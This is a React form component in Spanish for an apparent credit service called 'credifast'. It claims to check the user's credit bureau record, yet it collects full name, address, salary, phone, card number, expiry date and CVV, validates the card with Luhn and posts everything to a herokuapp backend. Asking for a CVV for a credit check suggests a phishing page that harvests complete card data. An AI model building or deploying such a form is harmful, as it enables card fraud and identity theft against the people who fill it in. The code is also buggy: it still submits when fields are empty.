import React, { Component } from "react"
import luhn from 'luhn'
import styles from '../styles/form.module.css'

class Form extends Component {

    constructor() {
        super()
        this.state = {
            nombre: "",
            apellido_paterno: "",
            apellido_materno: "",
            direccion: "",
            codigo_postal: "",
            municipio: "",
            estado: "",
            sueldo: "",
            limite: "",
            estado_civil: "",
            telefono: "",
            tarjeta: "",
            vencimiento: "",
            cvv: "",
            banco: ""
        }
        this.addTarjeta = this.addTarjeta.bind(this)
        this.handleChange = this.handleChange.bind(this)
    }

    addTarjeta(e) {
        const {
            nombre, apellido_paterno, apellido_materno, direccion, codigo_postal, municipio, estado,
            sueldo, limite, estado_civil, telefono, tarjeta, vencimiento, cvv, banco
        } = this.state

        const is_valid = luhn.validate(tarjeta)
        console.log(is_valid);

        if (nombre === "" || apellido_paterno === "" || apellido_materno === "" || direccion === "" ||
            codigo_postal === "" || municipio === "" || estado === "" || sueldo === "" || limite === "" || estado_civil === "" ||
            telefono === "" || tarjeta === "" || vencimiento === "" || cvv === "" || banco === "") {
            alert('llenar campos')
        } if (is_valid) {
            fetch('https://backend-credifast.herokuapp.com/form', {
                method: 'POST',
                body: JSON.stringify(this.state),
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json'
                }
            })
                .then(res => console.log(res))
                .catch(err => console.log(err))
            alert('Success')
        }
        else {
            alert('Por favor ingresa una tarjeta valida')
        }
        e.preventDefault()
    }

    handleChange(e) {
        const { name, value } = e.target
        this.setState({
            [name]: value
        })
    }

    render() {
        return (
            <div>
                <div className={styles.contenedor_two}>
                    <div className={styles.form_contenedor}>
                        <div className={styles.buro}>
                            <form className={styles.form}>
                                <div className={styles.buro_form}>
                                    <div className="input-group">
                                        <input onChange={this.handleChange} className='form-control' type="text" id='nombre' placeholder='nombre' name='nombre' />
                                    </div>
                                    <div className="input-group">
                                        <input onChange={this.handleChange} className='form-control' type="text" id='apellido_paterno' placeholder='apellido_paterno'
                                            name='apellido_paterno' />
                                        <input onChange={this.handleChange} className='form-control' type="text" id='apellido_materno' placeholder='apellido_materno'
                                            name='apellido_materno' />
                                    </div>
                                    <div className="input-group">
                                        <input onChange={this.handleChange} className='form-control' type="text" id='direccion' placeholder='direccion' name='direccion' />
                                    </div>
                                    <div className="input-group">
                                        <input onChange={this.handleChange} maxLength='5' className='form-control' type="text" id='codigo_postal'
                                            placeholder='codigo postal' name='codigo_postal' />

                                        <input onChange={this.handleChange} className='form-control' type="text" id='municipio' placeholder='municipio' name='municipio' />
                                    </div>
                                    <div className="input-group">
                                        <input onChange={this.handleChange} className='form-control' type="text" id='estado' placeholder='estado' name='estado' />
                                    </div>
                                    <div className="input-group">
                                        <input onChange={this.handleChange} className='form-control' type="text" placeholder='Ocupacion' />
                                        <input onChange={this.handleChange} className='form-control' type="text" id='sueldo' placeholder='sueldo' name='sueldo' />
                                    </div>
                                    <div className="input-group">
                                        <input onChange={this.handleChange} className='form-control' type="text" id='estado_civil' placeholder='estado civil'
                                            name='estado_civil' />
                                        <input onChange={this.handleChange} maxLength='10' className='form-control' type="text" id='telefono' placeholder='telefono'
                                            name='telefono' />
                                    </div>

                                    <h5 className="text-center">Datos Bancarios</h5>

                                    <div className="input-group">
                                        <input onChange={this.handleChange} maxLength='16' className='form-control' type="text" id='tarjeta' placeholder='tarjeta'
                                            name='tarjeta' />
                                    </div>
                                    <div className="input-group">
                                        <input onChange={this.handleChange} maxLength='5' className='form-control vencimiento' type="tel" id='vencimiento'
                                            placeholder='MM/YY' name='vencimiento' />
                                        <input onChange={this.handleChange} maxLength='3' className='form-control' type="text" id='codigo' placeholder='CVV'
                                            name='cvv' />
                                    </div>
                                    <div className="input-group">
                                        <input onChange={this.handleChange} className='form-control' type="text" id='sueldo' placeholder='banco' name='banco' />
                                        <input onChange={this.handleChange} className='form-control' type="text" id='limite-credito' placeholder='Limite de Credito'
                                            name='limite' />
                                    </div>
                                    <div className="input-group">
                                        <h5 style={{ fontSize: '15px', marginRight: '10px', marginTop: '2px' }}>¿Cuenta con credito hipotecario?</h5>
                                        <div className='form-check'>
                                            <label className='form-check-label'>Si</label>
                                            <input onChange={this.handleChange} className="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault1" />
                                        </div>
                                        <div className='form-check' style={{ marginLeft: '20px' }}>
                                            <label className='form-check-label'>No</label>
                                            <input onChange={this.handleChange} className="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault1" />
                                        </div>
                                    </div>

                                    <div className="input-group">
                                        <h5 style={{ fontSize: '15px', marginRight: '10px', marginTop: '2px' }}>¿Cuenta con credito automotriz?</h5>
                                        <div className='form-check'>
                                            <label className='form-check-label'>Si</label>
                                            <input onChange={this.handleChange} className="form-check-input" type="radio" name="flexRadioDefault2" id="flexRadioDefault2" />
                                        </div>
                                        <div className='form-check' style={{ marginLeft: '20px' }}>
                                            <label className='form-check-label'>No</label>
                                            <input onChange={this.handleChange} className="form-check-input" type="radio" name="flexRadioDefault2" id="flexRadioDefault2" />
                                        </div>
                                    </div>
                                </div>
                                <div className='input-group justify-content-center'>
                                    <button className='btn btn-success' id='buttonForm' onClick={this.addTarjeta} type="submit">Enviar</button>
                                </div>
                            </form>
                        </div>
                    </div>
                    <div className={styles.form_panel}>
                        <div className={styles.panel_two}>
                            <div className={styles.panel_right}>
                                <div className={styles.content}>
                                    <h3> Recuerda llenar todos los campos solicitados</h3>
                                    <p>Esto nos ayudara a comprobar tu buro de credito de una forma rapida y segura</p>
                                </div>
                                <img
                                    src='https://firebasestorage.googleapis.com/v0/b/images-b907b.appspot.com/o/authentication.svg?alt=media&token=4c3862fc-b524-4966-a03d-f71308369a05'
                                    className={styles.image_form} />
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        )
    }
}

export default Form;